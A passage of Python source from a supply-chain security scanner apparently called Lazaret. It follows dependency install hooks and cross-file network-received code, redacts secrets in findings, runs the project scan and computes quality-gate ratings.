    """The follower's findings for one package's modules (see the section comment)."""
    pkg = _XfPackage(mods)
    tainted = pkg.tainted()
    runners = pkg.runners()
    envs = {}
    for key, name in sorted(tainted):
        if name.startswith("<env>."):
            envs.setdefault(name[len("<env>."):], key)
    held, running = _xf_marked_members(pkg, tainted), _xf_marked_members(pkg, runners)
    heard = _xf_emitter_seeds(pkg, tainted, envs, held)
    if not tainted and not runners and not heard:
        return []
    out = []
    for mod in mods.values():
        if mod.path.replace(os.sep, "/") in skip:
            continue
        seeds, direct = _xf_seeds(pkg, mod, tainted, envs, held) if tainted else ({}, [])
        run_seeds = _xf_seeds(pkg, mod, runners, {}, running)[0] if runners else {}
        given, rows, first = heard.get(mod.key, ({}, [], 0))
        if not seeds and not direct and not run_seeds and not given:
            continue
        code = _import_code(mod.text, mod.lang)
        if _received_code_kind(code) is not None:
            continue                                    # the file shows it alone: the single-file test's
        code, more = _xf_rewrite(code, direct, mod.lang)
        seeds.update(more)
        names = sorted(seeds)[:_XF_MAX_SEEDS]
        who_ = who(mod.path) if callable(who) else who
        res = _received_code_kind(code, extra_always=names) if names else None
        if res is not None:
            out.append(_xf_issue(mod.path, res[0], mod.text, res[1], sorted({seeds[n] for n in names}), who_))
            continue
        if given:
            # the listeners' parameters seeded; a handler given by name called after the file
            end = code.count("\n") + 1
            both = dict(seeds, **given)
            names = sorted(both)[:_XF_MAX_SEEDS]
            res = _received_code_kind(code + "".join("\n" + r for r in rows), extra_always=names)
            if res is not None:
                out.append(_xf_issue(mod.path, first if res[0] > end else res[0], mod.text, res[1],
                                     sorted({both[n] for n in names}), who_))
                continue
        if run_seeds:
            run_names = sorted(run_seeds)[:_XF_MAX_SEEDS]
            res = _received_code_kind(code, extra_always=names, extra_runners=run_names)
            if res is not None and res[1] == "run":
                out.append(_xf_issue(mod.path, res[0], mod.text, "run", sorted({run_seeds[n] for n in run_names}),
                                     who_, runner=True))
    return out


# (the detection round) The top-level modules and packages one distribution
# installs into site-packages are one package to the follower in a --deps
# scan too, as a registry scan reads a release (one_package): the
# distribution's .dist-info/RECORD lists them (_xf_site_groups). Top-level
# names no RECORD lists together stay packages of their own (two
# distributions). At most _XF_RECORD_BYTES of a RECORD are read.
_XF_RECORD_BYTES = 4 << 20
_XF_SITE_MARKERS = ("site-packages", "dist-packages")


def _xf_site_groups(root, files):
    """{'/'-separated path: group} for the dependency Python files under a
    site-packages or dist-packages directory of the scan root `root` whose
    top-level module or package a distribution's RECORD lists with another
    (see above): the group is that directory and the first such
    .dist-info's name, by name."""
    sites = {}                                      # site dir -> {top-level name: [paths]}
    for f in files:
        if not f.get("dep") or f["lang"] != "py":
            continue
        path = f["path"].replace(os.sep, "/")
        parts = path.split("/")
        idx = max((len(parts) - 1 - parts[::-1].index(m) for m in _XF_DEP_MARKERS if m in parts), default=-1)
        if idx < 0 or idx >= len(parts) - 1 or parts[idx] not in _XF_SITE_MARKERS:
            continue
        sites.setdefault("/".join(parts[:idx + 1]), {}).setdefault(parts[idx + 1], []).append(path)
    out = {}
    for site, tops in sites.items():
        if len(tops) < 2:
            continue
        where = os.path.join(root, *site.split("/"))
        try:
            names = sorted(n for n in os.listdir(where) if n.endswith(".dist-info"))
        except OSError:
            continue
        label = {}                                  # top-level name -> its group's .dist-info
        for name in names:
            try:                                    # (a real directory: no link is followed)
                st = os.lstat(os.path.join(where, name))
            except OSError:
                continue
            if not _stat.S_ISDIR(st.st_mode) or _is_reparse_point(st):
                continue
            listed = sorted({t for t in _xf_record_tops(os.path.join(where, name, "RECORD")) if t in tops})
            if len(listed) < 2:
                continue
            joined = {name} | {label[t] for t in listed if t in label}
            first = min(joined)
            for t in [t for t, g in label.items() if g in joined] + listed:
                label[t] = first
        for top, group in label.items():
            for path in tops[top]:
                out[path] = site + "/" + group
    return out


def _xf_record_tops(path):
    """The top-level names a RECORD lists (its rows' first path parts), none
    when it cannot be read as one (not a regular file, too large, not text)."""
    try:
        data = _read_prefix(path, _XF_RECORD_BYTES + 1)
    except (OSError, ValueError):
        return set()
    if len(data) > _XF_RECORD_BYTES:
        return set()
    out = set()
    for row in data.decode("utf-8", "replace").split("\n"):
        entry = row.split(",", 1)[0].strip().strip('"').replace("\\", "/")
        top = entry.split("/", 1)[0]
        if top and top not in (".", "..") and ":" not in top:
            out.add(top)
    return out


def _xf_groups(files, one_package=False, site_groups=None):
    """{(lang, root): [(module key, extra, file)]}: the dependency files the
    follower reads, by package (see _cross_file_received_issues), each
    package and its files in the order the files come. `extra`: a Python
    module's is_package, an npm file's path in its package. `site_groups`:
    _xf_site_groups' answer, the packages a distribution's modules make."""
    groups, site_groups = {}, site_groups or {}
    for f in files:
        if not f.get("dep"):
            continue
        if f["lang"] == "py":
            info = _xf_py_module(f["path"])
            if info is not None:
                root = "" if one_package else site_groups.get(f["path"].replace(os.sep, "/"), info[0])
                groups.setdefault(("py", root), []).append((info[1], info[2], f))
        elif f["lang"] == "js":
            root = _xf_js_package(f["path"])
            if root is not None:
                rel = f["path"].replace(os.sep, "/")[len(root) + 1:]
                groups.setdefault(("js", root), []).append((_xf_js_norm(rel), rel, f))
    return groups


def _xf_group_issues(lang, members, skip, who):
    """The follower's findings for one package of _xf_groups (`skip`: a set
    of '/'-separated paths); none for one it does not read, or that raises."""
    if not 2 <= len(members) <= _XF_MAX_FILES:          # needs >= 2; a huge package is skipped
        return []
    if not any(any(n in f["content"] for n in _DL_NEEDLES) for _k, _x, f in members):
        return []                                       # no network source anywhere: nothing is received
    try:
        mods = {}
        for key, extra, f in members:
            mod = _XfModule(key, lang, f["path"], f["content"])
            if lang == "py":
                _xf_py_parse(mod, key.split(".") if extra else key.split(".")[:-1])
            else:
                _xf_js_parse(mod, extra)
            mods[key] = mod
        return _xf_package_issues(mods, skip, who)
    except Exception:                                   # one package must never kill the scan
        return []


def _cross_file_received_issues(files, skip_paths=(), who="Dependency code", one_package=False, site_groups=None):
    """SC-IMPORT-RISK for each dependency file that runs a value received over
    the network in another file of the same package, or receives one and
    hands it to another file's function that runs it (see the section
    comment), in Python and in npm packages. Skips the files in `skip_paths`
    (those already flagged single-file). `who(path)` may name the file in the
    message. A registry scan reads one distribution: `one_package` groups all
    its Python modules as one package (its top-level packages and modules
    import each other); a --deps scan, the modules a distribution's RECORD
    lists (`site_groups`: _xf_site_groups). Best-effort: a package that
    raises is skipped. The native engine's `cross_file` is this function
    (engine.cross_file_issues)."""
    skip = set(skip_paths)
    out = []
    for (lang, _root), members in _xf_groups(files, one_package, site_groups).items():
        out.extend(_xf_group_issues(lang, members, skip, who))
    return out


def dependency_checks(root, files, manifests, issues, excludes=(), should_stop=None):
    """The --deps checks of what dependencies run (see the section comment),
    after the files and manifests were scanned: escalates the SC-INSTALL-HOOK
    findings of dependency manifests in `issues` in place and returns
    (new_issues, extra_files, stopped): the findings to add, the files read
    and scanned here (to add to the scanned files), and should_stop's reason
    when it stopped the checks (None otherwise)."""
    tree = _DependencyTree(root, files, manifests, excludes)
    dep_manifests = {m["path"] for m in manifests if m.get("dep")}
    out, extra, run = [], [], set()
    followed_to_end = {}                    # manifest -> SC-TRUNCATED issue added for it
    out.extend(_implicit_gyp_hooks(tree, manifests))
    for issue in issues:
        if issue["rule"] != "SC-INSTALL-HOOK" or not issue.get("cmd") or issue["file"] not in dep_manifests:
            continue
        if should_stop is not None:
            stopped = should_stop()
            if stopped:
                return out, extra, stopped
        try:
            _follow_dependency_hook(tree, issue, out, extra, run, followed_to_end)
        except Exception as exc:            # one manifest must never kill the run
            out.append(scan_error_issue(issue["file"], exc))
    # the import-time test for each dependency file, a batch at a time: the
    # native engine reads a batch on threads (engine.py); the Python engine
    # one file at a time, as it always has
    from lazaret.scanner import engine
    assets = _deps_web_assets(tree, files)
    todo = [f for f in files
            if f.get("dep") and f["lang"] in ("js", "py") and f["path"].replace(os.sep, "/") not in run
            and f["path"].replace(os.sep, "/") not in assets]
    size = engine.BATCH if engine.name() == "rust" else 1
    for start in range(0, len(todo), size):
        if should_stop is not None:
            stopped = should_stop()
            if stopped:
                return out, extra, stopped
        chunk = todo[start:start + size]
        try:
            risks = engine.import_time_risks([(f["content"], f["lang"]) for f in chunk])
        except Exception:                   # each file is then read on its own below
            risks = [None] * len(chunk)
        for f, risk in zip(chunk, risks):
            try:
                found = dependency_import_issue(f["path"], f["content"], f["lang"], risk=risk)
                agent = dependency_agent_issue(f["path"], f["content"])
            except Exception as exc:
                found, agent = scan_error_issue(f["path"], exc), None
            if found is not None:
                out.append(found)
            if agent is not None:
                out.append(agent)
    # Cross-file received code (both engines since 0.1.8): a value received in one
    # file of a package and run in another, by the engine in use (the native
    # engine reads the packages on threads: engine.cross_file_issues). Reached
    # only when the checks above did not stop (each returns early on
    # should_stop), so no extra should_stop call here — it is a bounded pass.
    # Skips the files already flagged CRITICAL single-file (a MAJOR one can
    # still be found running what another file received).
    flagged = {i["file"].replace(os.sep, "/") for i in out if i["rule"] == "SC-IMPORT-RISK" and i["sev"] == "CRITICAL"}
    code = [f for f in files if f["path"].replace(os.sep, "/") not in assets] if assets else files
    out.extend(engine.cross_file_issues(code, flagged, site_groups=_xf_site_groups(tree.root, code)))
    return out, extra, None


def _deps_web_assets(tree, files):
    """The '/'-separated paths of the dependency JavaScript files that are a
    web app's static assets (see the section comment): in a _next, static
    or public directory of their package, and reached from none of its npm
    package's entry points."""
    found = {}                              # npm package root (None: not npm's) -> [paths]
    for f in files:
        if not f.get("dep") or f["lang"] != "js":
            continue
        path = f["path"].replace(os.sep, "/")
        root = _xf_js_package(path)
        rel = path[len(root) + 1:] if root is not None else path
        if any(part.lower() in _DEPS_WEB_DIRS for part in rel.split("/")[:-1]):
            found.setdefault(root, []).append(path)
    out = set()
    for root, paths in found.items():
        reached = _deps_npm_reach(tree, root) if root is not None else set()
        out.update(p for p in paths if p not in reached)
    return out


def _deps_npm_entries(data):
    """The paths an npm package.json's main, module, bin and exports name."""
    out = []
    for key in ("main", "module"):
        if isinstance(data.get(key), str):
            out.append(data[key])
    b = data.get("bin")
    out.extend([b] if isinstance(b, str) else [v for v in b.values() if isinstance(v, str)] if isinstance(b, dict) else [])
    stack = [data.get("exports")]
    while stack and len(out) < _DEPS_REACH_MAX:
        e = stack.pop()
        if isinstance(e, str):
            if "*" not in e:
                out.append(e)
        elif isinstance(e, dict):
            stack.extend(reversed(list(e.values())))
        elif isinstance(e, list):
            stack.extend(reversed(e))
    return out


def _deps_npm_reach(tree, root):
    """The files of the npm package at `root` its entry points reach: what
    Node runs for the package itself and for each entry point, then the
    local files they require or import and the scripts they start with
    node (spawned_scripts), transitively (at most _DEPS_REACH_MAX)."""
    manifest = tree.manifests.get(root + "/package.json")
    data = None
    if manifest is not None:
        data, _problems = load_manifest(manifest["path"], manifest["content"])
    entries = _deps_npm_entries(data) if isinstance(data, dict) else []
    queue = [tree.resolve(root)] + [tree.resolve(t) for t in (_tree_join(root, e) for e in entries) if t is not None]
    seen = set()
    while queue and len(seen) < _DEPS_REACH_MAX:
        rel = queue.pop()
        if rel is None or rel in seen or not rel.startswith(root + "/"):
            continue
        seen.add(rel)
        f = tree.sources.get(rel)
        if f is None or f.get("lang") != "js":
            continue
        base = posixpath.dirname(rel)
        targets = [(base, t) for _q, t in _DEPS_LOCAL_DEP_RE.findall(f["content"])]
        targets += [(base if where == "dir" else root, t) for where, t in spawned_scripts(f["content"])]
        for at, target in targets:
            joined = _tree_join(at, target)
            if joined is not None:
                queue.append(tree.resolve(joined))
    return seen


def _is_package_root(directory):
    """Is `directory` ('/'-separated) an installed npm package's own root:
    node_modules/<name> or node_modules/@scope/<name>?"""
    parts = directory.split("/")
    return len(parts) >= 2 and (parts[-2] == "node_modules" or (
        len(parts) >= 3 and parts[-3] == "node_modules" and parts[-2].startswith("@")))


def _implicit_gyp_hooks(tree, manifests):
    """SC-INSTALL-HOOK (MAJOR) for each dependency npm builds with node-gyp:
    for a package whose root holds a binding.gyp, and whose package.json
    names no install or preinstall script (and does not set "gypfile":
    false), npm runs `node-gyp rebuild` on install — the hook the registry
    lists as "install (implicit)" (_ArtifactScan._implicit_gyp_hook). A
    package with no install script at all ran its binding.gyp's actions and
    command expansions without a hook finding."""
    out = []
    for m in manifests:
        rel = m["path"].replace(os.sep, "/")
        if not m.get("dep") or posixpath.basename(rel) != "package.json":
            continue
        base = posixpath.dirname(rel)
        gyp = posixpath.join(base, "binding.gyp")
        if not _is_package_root(base) or gyp not in tree.manifests:
            continue
        data, _problems = load_manifest(m["path"], m["content"])
        if not isinstance(data, dict) or data.get("gypfile") is False:
            continue
        scripts = data.get("scripts") if isinstance(data.get("scripts"), dict) else {}
        if any(isinstance(scripts.get(h), str) and scripts[h].strip() for h in ("install", "preinstall")):
            continue
        out.append(_sc_install_hook_issue(tree.manifests[gyp]["path"], 1, [], "install (implicit)",
                                          "node-gyp rebuild", False))
    return out


def _follow_dependency_hook(tree, issue, out, extra, run, followed_to_end):
    from lazaret.scanner import engine     # (imported here: engine imports core)
    manifest = issue["file"]
    base = posixpath.dirname(manifest.replace(os.sep, "/"))
    direct = agent_hijack_in_command(issue["cmd"])         # the hook runs the agent itself
    if direct is not None:
        m = tree.manifests.get(manifest.replace(os.sep, "/"))
        if m is not None:
            mlines = m["content"].split("\n")
            out.append(_agent_hijack_issue(manifest, issue["line"], mlines, direct[0], direct[1],
                                           redactor=_Redactor(mlines)))
    persist = persistence_reasons(issue["cmd"])            # the command itself plants something
    if persist and issue["sev"] not in ("BLOCKER", "CRITICAL"):
        msg = f"Install hook command {'; and '.join(persist)}."
        issue["sev"] = "CRITICAL"
        issue["msg"] = _redact_text(msg) if REDACT_SECRETS else msg
    targets, complete = follow_hook(issue["cmd"])
    if not complete and manifest not in followed_to_end:
        followed_to_end[manifest] = True
        out.append(truncated_issue(manifest, (
            f"its install hook is more than Lazaret follows ({HOOK_MAX_COMMANDS:,} commands, "
            f"{HOOK_MAX_TARGETS} scripts, {HOOK_MAX_CHARS:,} characters, "
            f"{HOOK_MAX_PATH:,}-character paths)")))
    for target in targets:
        path = _tree_join(base, target)
        rel = tree.resolve(path) if path is not None else None
        if rel is None:
            continue
        text = _dependency_script_text(tree, rel, "sh" if rel.endswith(".sh") else "js", out, extra, run)
        reasons = engine.install_script_risk(text) if text else []
        if reasons and issue["sev"] not in ("BLOCKER", "CRITICAL"):
            msg = f"Install hook runs {target}, which {'; and '.join(reasons)}."
            issue["sev"] = "CRITICAL"
            issue["msg"] = _redact_text(msg) if REDACT_SECRETS else msg
        agent = dependency_agent_issue(rel.replace("/", os.sep), text) if text else None
        if agent is not None:
            out.append(agent)
        # the scripts it starts with node or python (0.1.8, spawned_scripts)
        for started, stext in _started_dependency_scripts(tree, rel, text, base, out, extra, run):
            more = engine.install_script_risk(stext) if stext else []
            if more and issue["sev"] not in ("BLOCKER", "CRITICAL"):
                shown = started[len(base) + 1:] if base and started.startswith(base + "/") else started
                msg = f"Install hook runs {target}, which starts {shown}, which {'; and '.join(more)}."
                issue["sev"] = "CRITICAL"
                issue["msg"] = _redact_text(msg) if REDACT_SECRETS else msg


def _started_dependency_scripts(tree, rel, text, cwd, out, extra, run):
    """[(rel, text)] for the scripts a dependency's install script `rel`
    starts with node or python, and those they start (spawned_scripts), at
    most _SPAWN_MAX_DEPTH starts deep and _SPAWN_MAX_FILES files. `cwd`: the
    package's directory, where a plain literal path is read from."""
    from lazaret.scanner import engine     # (imported here: engine imports core)
    found, seen, queue = [], {rel}, [(rel, text, 0)]
    while queue and len(seen) <= _SPAWN_MAX_FILES:
        cur, cur_text, depth = queue.pop(0)
        if not cur_text or depth >= _SPAWN_MAX_DEPTH:
            continue
        for where, path in engine.spawned_scripts(cur_text):
            joined = _tree_join(posixpath.dirname(cur) if where == "dir" else cwd, path)
            nxt = tree.resolve(joined) if joined is not None else None
            if nxt is None or nxt in seen or len(seen) > _SPAWN_MAX_FILES:
                continue
            seen.add(nxt)
            lang = "py" if nxt.endswith(".py") else ("sh" if nxt.endswith(".sh") else "js")
            ntext = _dependency_script_text(tree, nxt, lang, out, extra, run)
            found.append((nxt, ntext))
            queue.append((nxt, ntext, depth + 1))
    return found


def _dependency_script_text(tree, rel, as_lang, out, extra, run):
    """Text of a file an install hook runs, or None when it cannot be read
    as text (an SC-TRUNCATED finding then says why)."""
    run.add(rel)
    if rel in tree.sources:
        return tree.sources[rel]["content"]
    if rel in tree.manifests:
        return tree.manifests[rel]["content"]
    if rel not in tree.read:
        tree.read[rel] = _read_dependency_script(tree, rel, as_lang, out, extra)
    return tree.read[rel]


def _read_dependency_script(tree, rel, as_lang, out, extra):
    """A file an install hook runs that the walk did not read as source:
    read it, and scan it as a dependency's JavaScript (node runs
    lib/install.dat as JavaScript) unless it is a shell script."""
    disp = rel.replace("/", os.sep)
    try:
        data = _read_prefix(os.path.join(tree.root, *rel.split("/")), SOURCE_SIZE_CAP + 1)
    except OSError as exc:
        reason = str(exc) if isinstance(exc, _NotRegularFile) else exc.strerror or type(exc).__name__
        out.append(truncated_issue(disp, f"it runs at install time but could not be read ({reason})"))
        return None
    if len(data) > SOURCE_SIZE_CAP:
        out.append(truncated_issue(disp, f"it runs at install time but is larger than the "
                                         f"{SOURCE_SIZE_CAP:,}-byte file limit"))
        return None
    if looks_binary(data[:2048]):
        out.append(truncated_issue(disp, "it runs at install time but is not text, so it could not be scanned"))
        return None
    if as_lang == "sh" or shebang_lang(data[:HEADER_SAMPLE_BYTES].decode("utf-8", "replace")) == "sh":
        return normalize_newlines(data.decode("utf-8", "replace"))
    from lazaret.scanner import engine     # (imported here: engine imports core)
    text, decode_issues = decode_member(disp, data, lang="js")
    out.extend(decode_issues)
    out.extend(engine.scan_file(disp, text, "js", dep=True))
    extra.append({"path": disp, "content": text, "lang": "js", "dep": True})
    return text


def dependency_import_issue(path, text, lang=None, risk=None):
    """SC-IMPORT-RISK (MAJOR, or CRITICAL: import_time_severity) for a
    dependency's JavaScript or Python file (`lang` 'js' or 'py') that fails
    the import-time test (import_time_risk; `risk`: its answer, when the
    caller has it already), else None."""
    reasons, line = risk if risk is not None else import_time_risk(text, lang)
    if not reasons:
        return None
    lines = text.split("\n")
    return mk_issue(
        {"id": "SC-IMPORT-RISK", "name": "Risky import-time code", "type": "HOTSPOT",
         "sev": import_time_severity(reasons),
         "msg": f"Dependency code {'; and '.join(reasons)}.", "why": _DEP_IMPORT_RISK_WHY,
         "fix": "Read the file: what does it collect, and where does it send it?",
         "ref": "CWE-506 · Supply chain"}, path, line, lines, redactor=_Redactor(lines))


def redact_file_issues(issues, files):
    """Apply each scanned file's redaction to the findings numbered by its
    scan lines (source_lines: scan_file's and the flow engine's), in place.

    redact_result sweeps snippets with the secret patterns only, and a PEM
    block only when its BEGIN line is in the same snippet: a finding built
    from raw lines outside scan_file lacked the file's entropy literals and
    PEM blocks (review: the X-CMD snippet of a flow showed the `seed = "…"`
    literal S-ENTROPY redacted, in the JSON and the HTML report). Per file,
    the literal set and the file-wide PEM set are built once; every snippet
    line that is still the raw text of its file line becomes that line as
    mk_issue would show it (a line its builder already redacted or clipped
    is left alone), and msg / cmd get the file's literals. One file's lines
    are held at a time."""
    if not REDACT_SECRETS:
        return issues
    by_path = {f["path"]: f for f in files}
    groups = {}
    for i in issues:
        if i.get("file") in by_path:
            groups.setdefault(i["file"], []).append(i)
    for path, group in groups.items():
        f = by_path[path]
        red = _Redactor(source_lines(f["content"], f.get("lang")))
        for i in group:
            for key in ("msg", "cmd"):
                v = i.get(key)
                if isinstance(v, str):
                    nv = _redact_text(v, red.secrets())
                    if nv != v:
                        i[key] = nv
            snip, start = i.get("snippet"), i.get("snipStart")
            if not isinstance(snip, list) or not isinstance(start, int):
                continue
            out = None
            for k, line in enumerate(snip):
                j = start - 1 + k
                if isinstance(line, str) and 0 <= j < len(red.lines) and line == red.lines[j]:
                    shown = red.redacted(j)
                    if shown != line:
                        if out is None:
                            out = list(snip)
                        out[k] = shown
            if out is not None:
                i["snippet"] = out
    return issues


def scan_project(root, exclude=(), include_deps=False, taint_config=None,
                 redact_secrets=True, extra_issues=(), should_stop=None):
    """The complete project scan, shared by the CLI (main) and the MCP server:
    collect -> scan files -> manifests / binding.gyp -> collection findings
    (binary, pyc, encoding, symlink, unreadable, truncated) -> interprocedural
    flow analysis (guarded: a failure degrades to the intra-file engine with a
    visible warning) -> pruned-tree notes -> metrics / quality gate ->
    secret-redaction sweep. Prints nothing; safe to call repeatedly in one
    process (no per-scan module state leaks between calls).

    root            directory to scan (str)
    exclude         directory names to prune (like --exclude)
    include_deps    walk dependency trees too (like --deps)
    taint_config    optional, already-parsed taint spec (dict) applied before
                    scanning; rejected rules are returned as warnings. The CLI
                    loads and validates its config itself (SEAM: flow-sca's
                    taint-config block in main()) and passes None. NOTE: the
                    taint tables are process-global; a spec applied here stays
                    applied for later scans in the same process.
    redact_secrets  redact credentials in snippets (default on; REDACT_SECRETS
                    is restored afterwards)
    extra_issues    findings produced before the scan that belong in the
                    result (e.g. the CLI's Q-TAINT-CONFIG notes)
    should_stop     optional callable, checked before each file and manifest
                    (the MCP server's time budget and cancellation). It may
                    raise to abort the scan, or return a reason string to stop
                    early: the files not reached are then reported by one
                    SC-TRUNCATED finding (so a partial scan can never pass the
                    gate), the cross-file pass is skipped, and the result
                    carries "incomplete": True and "incompleteReason".

    Returns the build_result() dict — project, scannedAt, pass, conditions,
    metrics, counts, ratings, supplyChain, crossFile, perFile, issues — plus
    "warnings": [str] (degraded-analysis notes; the CLI prints them).
    Raises ScanTargetError (usage error) when root does not exist, is not a
    directory, cannot be read, or holds nothing to scan.
    """
    global REDACT_SECRETS
    root = os.fspath(root)
    if not os.path.exists(root):
        raise ScanTargetError(f"{_fs_display(root)} does not exist")
    if not os.path.isdir(root):
        raise ScanTargetError(f"{_fs_display(root)} is not a directory")
    saved_redact = REDACT_SECRETS
    REDACT_SECRETS = bool(redact_secrets)
    try:
        warnings = []
        # --- SEAM (flow-sca): library callers' taint spec ------------------
        if taint_config is not None:
            flow_warnings = []
            apply_taint_config(taint_config)
            if lazaret_flow is not None:
                lazaret_flow.configure(taint_config,
                                       on_warn=lambda msg: flow_warnings.append(msg))
            warnings.extend(f"taint config: {m}" for m in
                            _dedupe(get_taint_config_warnings() + flow_warnings))
        col = _collect(root, exclude, include_deps=include_deps)
        files, manifests, configs = col["files"], col["manifests"], col["configs"]
        if not files and not manifests and not configs and not col["pth"] and not col["issues"]:
            raise ScanTargetError(
                f"nothing to scan under {_fs_display(root)}: no Python, JavaScript or "
                f"SQL sources, package manifests or other files to check")
        issues = list(extra_issues) + list(col["issues"])
        numbered = []       # findings numbered by their file's scan lines (redact_file_issues)
        scanned, stopped = [], None
        # Files a batch at a time with the native engine (it reads a batch on
        # threads: engine.py; a project file's rules part there, the rest of
        # its scan in core), one at a time with the Python engine;
        # should_stop is checked before each batch.
        from lazaret.scanner import engine     # (imported here: engine imports core)
        batch = engine.BATCH if engine.name() == "rust" else 1
        k = 0
        while k < len(files):
            stopped = should_stop() if should_stop is not None else None
            if stopped:
                break
            chunk = [files[k]]
            while (len(chunk) < batch and k + len(chunk) < len(files)
                   and files[k + len(chunk)].get("dep", False) == chunk[0].get("dep", False)):
                chunk.append(files[k + len(chunk)])
            try:
                results = engine.scan_files([(f["path"], f["content"], f["lang"], f.get("dep", False)) for f in chunk])
            except Exception:                   # a file core could not scan: each again, on its own
                results = None
            for n, f in enumerate(chunk):
                try:
                    found = (results[n] if results is not None
                             else scan_file(f["path"], f["content"], f["lang"], dep=f.get("dep", False)))
                    issues.extend(found)
                    numbered.extend(found)
                except Exception as exc:        # one file must never kill the run
                    issues.append(scan_error_issue(f["path"], exc))
                scanned.append(f)
            k += len(chunk)
        checked = 0                         # config and data files: credentials only
        read = tree_reader(files, configs)  # what an editor's or agent's settings run (SC-AUTORUN)
        for cf in configs:
            if not stopped and should_stop is not None:
                stopped = should_stop()
            if stopped:
                break
            try:
                issues.extend(scan_config_file(cf["path"], cf["content"], read))
            except Exception as exc:
                issues.append(scan_error_issue(cf["path"], exc))
            checked += 1
        for mf in manifests:
            if not stopped and should_stop is not None:
                stopped = should_stop()
            if stopped:
                break
            try:
                issues.extend(_scan_manifest_entry(mf))
            except Exception as exc:
                issues.append(scan_error_issue(mf["path"], exc))
        if not stopped:
            # --deps: what the dependencies run (install hooks, import-time code)
            found, extra, dep_stopped = dependency_checks(root, files, manifests, issues, exclude, should_stop)
            issues.extend(found)
            numbered.extend(found)
            files.extend(extra)
            scanned.extend(extra)
            if dep_stopped:
                stopped = dep_stopped
                issues.append(truncated_issue(
                    ".", f"{stopped}: what the dependencies run was not checked to the end"))
        else:
            total = len(files) + len(configs)
            issues.append(truncated_issue(
                ".", f"{stopped}: {total - len(scanned) - checked} of {total} files "
                     f"not scanned"))
            files = scanned
        # G10: skipped-directory accounting — INFO findings make the coverage
        # gap visible instead of silent.
        issues.extend(skipped_tree_issues(col["skipped"]))
        if lazaret_flow is not None and not stopped:
            # The interprocedural engine can fail on input it does not
            # understand; degrade to the intra-file engine rather than crash
            # mid-scan, and say so instead of hiding it.
            try:
                flows = lazaret_flow.analyze(files)
                issues.extend(flows)
                numbered.extend(flows)
            except Exception as exc:
                warnings.append(f"interprocedural taint analysis skipped "
                                f"({type(exc).__name__}: {_safe_text(exc)})")
        # the flow engine copies raw source lines into its snippets: give
        # them (and every scan_file finding) the file's own redaction
        redact_file_issues(numbered, files)
        res = build_result(root, files, issues)
        res["metrics"]["configFiles"] = checked
        res["warnings"] = warnings
        if stopped:
            res.update(incomplete=True, incompleteReason=stopped)
        # L1: belt-and-braces — no SECRET-rule issue may reach a report or
        # the baseline fingerprinter with its raw flagged line.
        redact_result(res)
        return res
    finally:
        REDACT_SECRETS = saved_redact

# ---------------- Metrics / ratings ----------------
def compute_metrics(all_files):
    files = [f for f in all_files if not f.get("dep")]  # deps excluded from quality metrics
    ncloc = comments = 0
    win_map = {}
    for f in files:
        code = []
        flines = _unicode13.pin(f["content"]).split("\n")
        try:
            cmask = comment_mask(flines, f["lang"], jsx_reading(f["path"]))
        except Exception:       # its scan failed the same way (SC-TRUNCATED): count its lines
            cmask = None        # as code rather than lose the whole report (review B3)
        for i, l in enumerate(flines):
            t = l.strip()
            if not t:
                continue
            if cmask is not None and cmask[i]:
                comments += 1
                continue
            ncloc += 1
            code.append((t, i, f["path"]))
        for i in range(len(code) - 5):
            key = "".join(c[0] for c in code[i:i + 6])
            win_map.setdefault(key, []).append(code[i:i + 6])
    dup = set()
    for occ in win_map.values():
        if len(occ) > 1:
            for win in occ:
                for _, i, p in win:
                    dup.add((p, i))
    dup_pct = round(100 * len(dup) / ncloc, 1) if ncloc else 0.0
    return {"files": len(files), "depFiles": len(all_files) - len(files),
            "ncloc": ncloc, "comments": comments, "dupPct": dup_pct}

def worst_sev_rating(issues, types):
    sevs = {i["sev"] for i in issues if i["type"] in types}
    for sev, rating in (("BLOCKER", "E"), ("CRITICAL", "D"), ("MAJOR", "C"), ("MINOR", "B")):
        if sev in sevs:
            return rating
    return "A"

#: INFO scan-coverage notes. Typed SMELL for display, but they describe what
#: the scanner could not look at, not the code: they do not count toward the
#: maintainability rating (a single symlink in a small project used to be
#: enough to fail "Maintainability >= C").
COVERAGE_RULES = frozenset({"Q-SKIPPED-TREE", "Q-SYMLINK", "Q-UNREADABLE", "Q-SKIPPED-CONFIG",
                            # analysis-coverage notes from the flow engine (the
                            # npm engine's JavaScript pass writes the Q-FLOW
                            # notes too) and the taint-config loader (Python's)
                            "Q-FLOW-SKIPPED", "Q-FLOW-INCOMPLETE", "Q-FLOW-RECURSION",
                            "Q-TAINT-CONFIG"})

def _rated_smells(issue):
    """How many code smells a SMELL finding counts for in the rating: one,
    except a Q-CAPPED note, which counts the findings it stands for when
    they are smells (and nothing when they are bugs). The rating is then
    what it would be without the cap (review: 2000 over-long lines listed
    as 200 Q-LONGLINE + one Q-CAPPED rated C and passed; they are E)."""
    if issue.get("rule") == "Q-CAPPED" and isinstance(issue.get("omitted"), int):
        return issue["omitted"] if issue.get("omittedType") == "SMELL" else 0
    return 1


def maintainability_rating(issues, ncloc):
    smells = sum(_rated_smells(i) for i in issues
                 if i["type"] == "SMELL" and i.get("rule") not in COVERAGE_RULES)
    per100 = 100 * smells / ncloc if ncloc else 0
    for limit, rating in ((5, "A"), (10, "B"), (20, "C"), (40, "D")):
        if per100 <= limit:
            return rating
    return "E"

def build_result(root, files, issues):
    issues.sort(key=lambda i: (SEV_ORDER[i["sev"]], i["file"], i["line"]))
    metrics = compute_metrics(files)
    counts = {t: sum(1 for i in issues if i["type"] == t) for t in TYPE_LABEL}
    ratings = {"security": worst_sev_rating(issues, ("VULN",)),
               "reliability": worst_sev_rating(issues, ("BUG",)),
               "maintainability": maintainability_rating(issues, metrics["ncloc"])}
    conds = [
        {"label": "No blocker issues",
         "ok": not any(i["sev"] == "BLOCKER" for i in issues)},
        {"label": "No critical vulnerabilities",
         "ok": not any(i["type"] == "VULN" and i["sev"] in ("CRITICAL", "BLOCKER") for i in issues)},
        {"label": "Duplication < 10%", "ok": metrics["dupPct"] < 10},
        {"label": "Maintainability ≥ C", "ok": ratings["maintainability"] in "ABC"},
    ]
    per_file = {}
    for i in issues:
        per_file[i["file"]] = per_file.get(i["file"], 0) + 1
    # INFO supply-chain entries are inventory (e.g. a project's own prepare
    # hook, shared semantics 3), not indicators.
    supply = sum(1 for i in issues if i["rule"].startswith("SC-") and i["sev"] != "INFO")
    conds.append({"label": "No supply-chain indicators", "ok": supply == 0})
    cross_file = sum(1 for i in issues if i["rule"].startswith("X-"))
    conds.append({"label": "No cross-file taint flows", "ok": cross_file == 0})
    return {"project": _fs_display(os.path.abspath(os.fspath(root))),
